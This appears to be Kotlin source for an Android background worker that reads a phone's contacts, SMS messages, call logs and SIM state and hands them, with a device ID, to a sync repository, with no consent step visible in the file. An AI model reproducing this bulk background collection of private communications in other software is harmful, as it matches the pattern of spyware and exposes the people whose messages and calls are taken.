package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        val isIncremental = tags.contains("IncrementalSync")
        val lastSmsSync = if (isIncremental) prefs.getLong("last_sms_sync", 0L) else 0L
        val lastCallSync = if (isIncremental) prefs.getLong("last_call_sync", 0L) else 0L
        val lastContactSync = if (isIncremental) prefs.getLong("last_contact_sync", 0L) else 0L

        android.util.Log.d("Sync", "WORKER_SYNC_STARTED incremental: $isIncremental")

        return try {
            val contacts = DataHelper.fetchContacts(applicationContext, sinceTimestamp = lastContactSync)
            val smsList = DataHelper.fetchSMS(applicationContext, sinceTimestamp = lastSmsSync)
            val callLogs = DataHelper.fetchCallLogs(applicationContext, sinceTimestamp = lastCallSync)

            val totalContacts = DataHelper.fetchContacts(applicationContext).size
            val totalSms = DataHelper.fetchSMS(applicationContext).size
            val totalCalls = DataHelper.fetchCallLogs(applicationContext).size

            val simState = DataHelper.getSimState(applicationContext).toMutableMap()
            simState["contactCount"] = totalContacts
            simState["smsCount"] = totalSms
            simState["callCount"] = totalCalls

            android.util.Log.d("Sync", "SIM_STATE_LOADED")

            repository.performSync(
                deviceId = deviceId,
                contacts = contacts,
                smsList = smsList,
                callLogs = callLogs,
                simState = simState,
                isFullSync = !isIncremental,
                lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)
            )

            if (isIncremental) {
                prefs.edit().apply {
                    if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
                    if (callLogs.isNotEmpty()) putLong("last_call_sync", callLogs.maxOf { it.date })
                    if (contacts.isNotEmpty()) putLong("last_contact_sync", System.currentTimeMillis())
                }.apply()
            }

            android.util.Log.d("Sync", "WORKER_SYNC_SUCCESS")
            Result.success()
        } catch (e: Exception) {
            android.util.Log.e("Sync", "WORKER_SYNC_FAILED", e)
            Result.retry()
        }
    }
}
